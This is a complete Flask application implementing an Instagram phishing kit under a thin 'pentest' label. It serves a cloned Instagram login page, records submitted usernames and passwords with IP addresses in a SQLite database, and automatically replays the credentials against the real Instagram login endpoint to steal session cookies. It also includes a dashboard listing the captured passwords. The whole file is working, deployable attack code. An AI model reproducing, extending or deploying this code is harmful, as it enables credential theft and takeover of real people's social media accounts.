from flask import Flask, request, jsonify
import sqlite3
import datetime as dt
import time
import requests
import json
import threading

app = Flask(__name__)
DB_FILE = 'pentest_captures.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, username TEXT, password TEXT,
                  ip TEXT, ua TEXT, success TEXT, cookies TEXT,
                  session_ready TEXT DEFAULT 'no')''')
    conn.commit()
    conn.close()

init_db()

def bot_login(username, password):
    """🤖 Fast IG login"""
    session = requests.Session()
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        r = session.get('https://www.instagram.com/accounts/login/')
        csrf = session.cookies.get('csrftoken', '')
        headers['X-CSRFToken'] = csrf
        
        timestamp = str(int(time.time()))
        enc_pass = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
        
        data = {
            'username': username,
            'enc_password': enc_pass,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        r = session.post('https://www.instagram.com/accounts/login/ajax/',
                        data=data, headers=headers)
        result = r.json()
        success = result.get('authenticated', False)
        
        if success:
            cookies = dict(session.cookies)
            home = session.get('https://www.instagram.com/')
            return True, cookies, home.text
            
        return False, {}, None
    except Exception as e:
        print(f"❌ Bot error: {e}")
        return False, {}, None

@app.route('/')
def phish_page():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            line-height: 1.6;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            flex: 1;
        }
        
        /* Language Selector */
        .language-selector {
            display: flex;
            justify-content: flex-end;
            padding: 20px 0;
            font-size: 14px;
        }
        
        .language-selector select {
            background: transparent;
            border: none;
            font-size: 14px;
            color: #262626;
            outline: none;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        
        .language-selector select:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }
        
        /* Main Content */
        .main-content {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 140px);
            padding: 40px 0;
        }
        
        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            max-width: 350px;
            width: 100%;
        }
        
        /* Instagram Logo */
        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 72px;
            font-weight: normal;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 1px;
        }
        
        /* Tagline */
        .tagline {
            font-size: 22px;
            font-weight: 300;
            color: #262626;
            margin-bottom: 40px;
            text-align: center;
            line-height: 1.3;
            padding: 0 20px;
        }
        
        /* Login Form */
        .login-form {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 44px 40px 34px;
            width: 100%;
            margin-bottom: 10px;
        }
        
        .login-form h2 {
            font-size: 42px;
            font-weight: 600;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 33px;
            font-family: 'Billabong', cursive;
            font-weight: normal;
            font-size: 60px;
        }
        
        .login-form input {
            width: 100%;
            height: 36px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            padding: 9px 0 7px 8px;
            font-size: 14px;
            margin-bottom: 6px;
            box-sizing: border-box;
            outline: none;
        }
        
        .login-form input:focus {
            border-color: #b2b2b2;
            background: #fff;
        }
        
        .login-form .btn {
            width: 100%;
            height: 30px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            margin: 8px 0;
        }
        
        .login-form .btn:hover {
            background: #1877f2;
        }
        
        .login-form .btn:disabled {
            background: #b2b2b2;
            cursor: not-allowed;
        }
        
        #status {
            text-align: center;
            color: #262626;
            font-size: 14px;
            margin-top: 20px;
            min-height: 24px;
            font-weight: normal;
        }
        
        #error {
            color: #ed4956;
        }
        
        /* Spinner animation */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 5px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* OR Divider */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 15px;
        }
        
        /* Facebook Login */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin: 10px 0;
        }
        
        .fb-login i {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .fb-login:hover {
            text-decoration: underline;
        }
        
        /* Forgot Password */
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 15px;
            display: block;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        /* Signup Prompt */
        .signup-prompt {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 25px 40px;
            width: 100%;
            font-size: 14px;
            color: #262626;
            text-align: center;
            margin-top: 10px;
        }
        
        .signup-prompt a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-prompt a:hover {
            text-decoration: underline;
        }
        
        /* App Download */
        .app-download {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .app-download p {
            margin-bottom: 15px;
        }
        
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-badges img {
            height: 40px;
            cursor: pointer;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px 0;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 40px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px 10px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Phone Preview (Right Side) */
        .phone-preview {
            display: none;
        }
        
        /* For larger screens, show the phone preview */
        @media (min-width: 876px) {
            .main-content {
                justify-content: space-between;
            }
            
            .content-wrapper {
                margin-right: 50px;
            }
            
            .phone-preview {
                display: block;
                background-image: url('https://i.imgur.com/vx9VWqk.png');
                background-size: contain;
                background-repeat: no-repeat;
                background-position: center;
                width: 380px;
                height: 580px;
                position: relative;
            }
            
            .phone-preview::before {
                content: '';
                position: absolute;
                top: 25px;
                left: 112px;
                width: 250px;
                height: 445px;
                background-image: url('https://i.imgur.com/Lu1B7Qq.jpg');
                background-size: cover;
                background-position: center;
                border-radius: 22px;
            }
        }
        
        /* Custom Font for Instagram Logo */
        @font-face {
            font-family: 'Billabong';
            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
        }
        
        /* Mobile Responsiveness */
        @media (max-width: 768px) {
            .instagram-logo {
                font-size: 60px;
            }
            
            .tagline {
                font-size: 20px;
                padding: 0 10px;
            }
            
            .language-selector {
                justify-content: center;
                padding: 15px 0;
            }
            
            .phone-preview {
                display: none;
            }
        }
        
        @media (max-width: 450px) {
            .instagram-logo {
                font-size: 52px;
            }
            
            .tagline {
                font-size: 18px;
            }
            
            .login-form {
                padding: 30px 20px;
                background: transparent;
                border: none;
            }
            
            .signup-prompt {
                background: transparent;
                border: none;
            }
            
            .content-wrapper {
                padding: 0 15px;
            }
            
            .container {
                padding: 0;
            }
            
            .language-selector {
                padding: 10px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Language Selector -->
        <div class="language-selector">
            <select id="language-select">
                <option value="en" selected>English</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
                <option value="pt">Português</option>
            </select>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
            <div class="content-wrapper">
                <!-- Instagram Logo (outside form) -->
                <h1 class="instagram-logo">Instagram</h1>
                
                <!-- Tagline -->
                <p class="tagline">Share what you're into with the people who get you.</p>
                
                <!-- Login Form -->
                <div class="login-form">
                    <form id="login">
                        <input name="username" placeholder="Phone number, username, or email" required>
                        <input name="password" type="password" placeholder="Password" required>
                        <button type="submit" class="btn" id="btn">Log in</button>
                    </form>
                    
                    <!-- OR Divider -->
                    <div class="divider">
                        <span>OR</span>
                    </div>
                    
                    <!-- Facebook Login -->
                    <a href="#" class="fb-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    
                    <!-- Forgot Password -->
                    <a href="#" class="forgot-password">Forgot password?</a>
                    
                    <!-- Status Message -->
                    <div id="status"></div>
                </div>
                
                <!-- Sign Up Prompt -->
                <div class="signup-prompt">
                    Don't have an account? <a href="#" id="signup-link">Sign up</a>
                </div>
                
                <!-- App Download -->
                <div class="app-download">
                    <p>Get the app.</p>
                    <div class="app-badges">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" onclick="alert('App Store link would open here')">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" onclick="alert('Google Play link would open here')">
                    </div>
                </div>
            </div>
            
            <!-- Phone Preview (visible on desktop) -->
            <div class="phone-preview"></div>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            &copy; 2023 Instagram from Meta
        </div>
    </div>

    <script>
        let checkInterval;
        
        document.getElementById('login').onsubmit = async(e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            
            btn.disabled = true; 
            btn.innerHTML = 'Checking <span class="spinner"></span>';
            status.textContent = '⏳ Sending credentials to Instagram...';
            
            try {
                const fd = new FormData(e.target);
                const r = await fetch('/capture', { method: 'POST', body: fd });
                const d = await r.json();
                
                if (d.wait_id) {
                    status.textContent = '🔍 Verifying with Instagram servers...';
                    
                    checkInterval = setInterval(async() => {
                        try {
                            const checkR = await fetch(`/status/${d.wait_id}`);
                            const checkD = await checkR.json();
                            
                            if (checkD.ready) {
                                clearInterval(checkInterval);
                                btn.disabled = false;
                                
                                if (checkD.success) {
                                    status.innerHTML = '✅ Success! Loading your account...';
                                    setTimeout(() => location.href = `/home/${d.wait_id}`, 1200);
                                } else {
                                    status.innerHTML = '<span id="error">❌ Sorry, this username or password is incorrect. Please try again.</span>';
                                    btn.innerHTML = 'Try again';
                                }
                            }
                        } catch(e) {
                            console.log('Check failed, retrying...');
                        }
                    }, 800); // Check every 800ms
                } else {
                    // If no wait_id, handle as immediate response
                    btn.disabled = false;
                    if (d.success) {
                        status.innerHTML = '✅ Success! Loading...';
                        setTimeout(() => location.href = d.redirect || 'https://www.instagram.com/', 1200);
                    } else {
                        status.innerHTML = '<span id="error">❌ Invalid credentials. Please try again.</span>';
                        btn.innerHTML = 'Log in';
                    }
                }
            } catch(e) {
                status.innerHTML = '<span id="error">❌ Connection error. Please check your internet and try again.</span>';
                btn.disabled = false; 
                btn.innerHTML = 'Log in';
            }
        };
        
        // Signup link functionality
        document.getElementById('signup-link').addEventListener('click', function(e) {
            e.preventDefault();
            // In a real Flask app, this would redirect to a signup page
            window.location.href = '/signup';
        });
        
        // Facebook login functionality
        document.querySelector('.fb-login').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Facebook login would be implemented here. This is just a visual clone.');
        });
        
        // Forgot password functionality
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Password recovery would be implemented here. This is just a visual clone.');
        });
        
        // Language selector functionality (kept from original design)
        document.getElementById('language-select').addEventListener('change', function() {
            const selectedLanguage = this.value;
            console.log('Language changed to:', this.options[this.selectedIndex].text);
            
            // Show a simple alert for demonstration
            if (selectedLanguage !== 'en') {
                alert(`Language changed to ${this.options[this.selectedIndex].text}. In a real app, the page content would be translated.`);
            }
        });
        
        // Add some visual effects on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Animate the main content on load
            const mainContent = document.querySelector('.content-wrapper');
            mainContent.style.opacity = '0';
            mainContent.style.transform = 'translateY(20px)';
            
            setTimeout(() => {
                mainContent.style.transition = 'opacity 0.8s, transform 0.8s';
                mainContent.style.opacity = '1';
                mainContent.style.transform = 'translateY(0)';
            }, 300);
            
            // Animate the phone preview on desktop
            const phonePreview = document.querySelector('.phone-preview');
            if (phonePreview) {
                phonePreview.style.opacity = '0';
                setTimeout(() => {
                    phonePreview.style.transition = 'opacity 1.2s';
                    phonePreview.style.opacity = '1';
                }, 500);
            }
            
            // Clear any existing interval when page is unloading
            window.addEventListener('beforeunload', function() {
                if (checkInterval) {
                    clearInterval(checkInterval);
                }
            });
        });
    </script>
</body>
</html>    '''

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    # SAVE
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO captures (timestamp, username, password, ip, ua, success) VALUES (?, ?, ?, ?, ?, 'checking')", 
              (dt.datetime.now().isoformat(), username, password, ip, ua))
    capture_id = c.lastrowid
    conn.commit()
    conn.close()
    
    print(f"\n🎣 HIT #{capture_id}: {username}")
    
    # BOT (FAST)
    def verify():
        success, cookies, home_html = bot_login(username, password)
        status = '✅ SUCCESS' if success else '❌ FAILED'
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        cookies_json = json.dumps(cookies) if success else ''
        session_ready = 'yes' if success else 'no'
        c.execute("UPDATE captures SET success=?, cookies=?, session_ready=? WHERE id=?", 
                 (status, cookies_json, session_ready, capture_id))
        conn.commit()
        conn.close()
        
        print(f"🤖 {status} | Ready: {session_ready}")
    
    threading.Thread(target=verify, daemon=True).start()
    
    return jsonify({'wait_id': capture_id})

@app.route('/status/<int:capture_id>')
def status_check(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT success, session_ready FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'ready': False})
    
    status, session_ready = row
    if status == 'checking':
        return jsonify({'ready': False})
    
    return jsonify({
        'ready': True, 
        'success': status == '✅ SUCCESS'
    })

@app.route('/home/<int:capture_id>')
def real_home(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT cookies, username FROM captures WHERE id=? AND session_ready='yes'", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        cookies = json.loads(row[0])
        username = row[1]
        
        cookie_str = '; '.join([f'{k}={v}' for k,v in cookies.items()])
        
        return f'''
<!DOCTYPE html>
<html><head><title>{username} - Instagram</title>
<script>
document.cookie = "{cookie_str}";
setTimeout(() => window.location.href = "https://www.instagram.com/", 500);
</script></head>
<body style="background:#fafafa;font-family:Arial;text-align:center;padding:100px;">
<h2>✅ Welcome back, {username}!</h2>
<p>Your Instagram account is loading...</p>
</body></html>
        '''
    return '<h1>❌ Login failed</h1><script>setTimeout(()=>location.href="/",2000);</script>'

@app.route('/data_captured')
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    
    html = f'''
<!DOCTYPE html><html><head><title>PENTEST DASHBOARD</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px;}}h1{{color:#0f0;}}
table{{width:100%;border-collapse:collapse;}}th,td{{border:1px solid #333;padding:8px;}}
th{{background:#222;}}.success{{color:#0f0;}}.failed{{color:#f00;}}.checking{{color:#ff0;}}.real{{color:#0ff;}}</style></head>
<body><h1>🎣 CAPTURES ({len(rows)})</h1><a href="/" style="color:#0f0;">← Phish</a>
<table><tr><th>ID</th><th>Time</th><th>User</th><th>Pass</th><th>IP</th><th>Status</th><th>Real?</th></tr>'''
    
    for row in rows:
        status = row[6] or 'pending'
        status_class = {'✅ SUCCESS':'success', '❌ FAILED':'failed', 'checking':'checking'}.get(status, 'checking')
        real = '<span class="real">✅</span>' if row[8]=='yes' else '❌'
        html += f'<tr><td>{row[0]}</td><td>{row[1][:19]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td class="{status_class}">{status}</td><td>{real}</td></tr>'
    
    html += '</table></body></html>'
    return html

if __name__ == '__main__':
    print("🔥 PERFECT SYNC v4.1 - Frontend WAITS for Bot!")
    print("🌐 http://127.0.0.1:5000")
    print("📊 http://127.0.0.1:5000/data_captured")
    app.run(host='0.0.0.0', port=5000, debug=True)